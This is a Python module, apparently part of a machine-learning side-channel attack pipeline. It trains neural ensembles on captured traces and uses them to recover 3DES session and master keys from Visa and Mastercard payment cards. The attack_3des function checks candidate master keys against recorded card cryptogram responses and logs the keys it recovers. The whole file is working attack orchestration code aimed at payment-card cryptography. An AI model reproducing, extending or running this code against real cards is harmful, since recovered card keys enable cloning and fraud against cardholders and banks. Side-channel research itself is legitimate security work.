import os
from typing import Dict, Optional, Tuple

import pandas as pd

from src.feature_eng import perform_feature_extraction
from src.inference_3des import recover_3des_keys
from src.train_ensemble import train_ensemble
from src.utils import setup_logger

logger = setup_logger("pipeline_3des")


def preprocess_3des(
    input_dir: str,
    processed_dir: str,
    opt_dir: str,
    file_pattern: str,
    card_type: str,
    use_existing_pois: bool,
    include_secrets: bool,
    enable_external_labels: bool = False,
    label_map_xlsx: Optional[str] = None,
    strict_label_mode: bool = False,
) -> Tuple[Optional[str], Optional[str]]:
    return perform_feature_extraction(
        input_dir,
        processed_dir,
        n_pois=1500,
        file_pattern=file_pattern,
        use_existing_pois=use_existing_pois,
        card_type=card_type,
        include_secrets=include_secrets,
        trace_type="3des",
        opt_dir=os.path.join(opt_dir, "pois_3des"),
        enable_external_labels=enable_external_labels,
        label_map_xlsx=label_map_xlsx,
        strict_label_mode=strict_label_mode,
    )


def train_3des(
    processed_dir: str,
    model_root: str,
    models_per_sbox: int,
    epochs: int,
    early_stop_patience: int,
) -> None:
    os.makedirs(model_root, exist_ok=True)
    logger.info("Training 3DES ensemble into %s", model_root)
    train_ensemble(
        input_dir=processed_dir,
        output_dir=model_root,
        models_per_sbox=models_per_sbox,
        epochs=epochs,
        early_stop_patience=early_stop_patience,
    )


def _resolve_3des_model_root(model_root: str) -> str:
    if os.path.isdir(os.path.join(model_root, "3des")):
        return model_root
    for cand in [
        os.path.join(model_root, "Ensemble_3des_new"),
        os.path.join(model_root, "Ensemble_ZaidNet"),
        os.path.join(model_root, "Ensemble_Final_Green"),
        os.path.join(model_root, "Ensemble_Visa_Pure"),
        os.path.join(model_root, "Ensemble_Visa"),
    ]:
        if os.path.isdir(os.path.join(cand, "3des")):
            logger.info("Using 3DES models from %s", cand)
            return cand
    return model_root


def _resolve_masterkey_model_root(model_root: str) -> str:
    for cand in [
        os.path.join(model_root, "Ensemble_MasterKey_Visa_Dedicated"),
        os.path.join(model_root, "Ensemble_MasterKey_Visa"),
    ]:
        if os.path.isdir(cand):
            return cand
    return model_root


def attack_3des(
    processed_dir: str,
    model_root: str,
    card_type: str = "universal",
    target_key: str = "session",
) -> Tuple[Optional[Dict[str, str]], Optional[str]]:
    if target_key == "master":
        from src.inference_masterkey import run_master_key_attack

        feats_dir = processed_dir if os.path.exists(os.path.join(processed_dir, "X_features.npy")) else processed_dir
        model_dir = _resolve_masterkey_model_root(model_root)
        k1_candidates = run_master_key_attack(feats_dir, model_dir, card_type=card_type)

        final_3des_key = None
        if k1_candidates:
            verified_key = None
            from src.pyDes import des, ECB

            meta_path = os.path.join(processed_dir, "Y_meta.csv")
            meta_df = pd.read_csv(meta_path)

            if card_type != "universal":
                target_t2_prefix = "5" if card_type == "mastercard" else ("4" if card_type == "visa" else None)
                if target_t2_prefix:
                    meta_df = meta_df[meta_df["Track2"].astype(str).str.startswith(target_t2_prefix)]
                    logger.info("Internal Verification: Filtered metadata to %d %s traces.", len(meta_df), card_type)

            for candidate in k1_candidates:
                k_hex = f"{candidate:016X}"
                k_obj = des(bytes.fromhex(k_hex), ECB, pad=None)
                success_count = 0
                for _, row in meta_df.head(5).iterrows():
                    atc = str(row.get("ATC", "0000")).zfill(4)
                    resp = str(row.get("ACM_receive", "")).strip().upper()
                    if resp and len(resp) >= 16:
                        challenge = bytes.fromhex(atc + "000000000000")
                        if k_obj.encrypt(challenge).hex().upper() == resp[:16]:
                            success_count += 1
                if success_count > 0:
                    verified_key = k_hex
                    break

            if verified_key:
                final_3des_key = verified_key * 3
                logger.info("Verified 100%% Recovered Master Key (K1): %s", verified_key)
            else:
                logger.error("STRICT MODE: No 3DES candidate verified by hardware response. Key recovery FAILED.")

        return None, final_3des_key

    model_dir = _resolve_3des_model_root(model_root)
    predicted = recover_3des_keys(processed_dir, model_dir, card_type=card_type)
    return predicted, None
